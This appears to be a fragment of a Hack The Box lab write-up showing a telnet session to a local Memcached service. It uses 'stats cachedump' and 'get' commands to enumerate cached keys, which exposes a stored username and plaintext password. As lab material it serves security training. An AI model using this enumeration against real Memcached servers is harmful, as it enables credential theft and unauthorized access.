# Memcached Service on port 11211.

```bash
ash@cache:/dev/shm$ telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
version
VERSION 1.5.6 Ubuntu
stats
<snip>
STAT lru_bumps_dropped 0
END
stats slabs
STAT 1:chunk_size 96
<snip>
STAT active_slabs 1
STAT total_malloced 1048576
END
stat items
ERROR
stats items
STAT items:1:number 5
<snip>
END
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
get link
VALUE link 0 21
https://hackthebox.eu
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
get account
VALUE account 0 9
afhj556uo
END
get file
VALUE file 0 7
nothing
END
```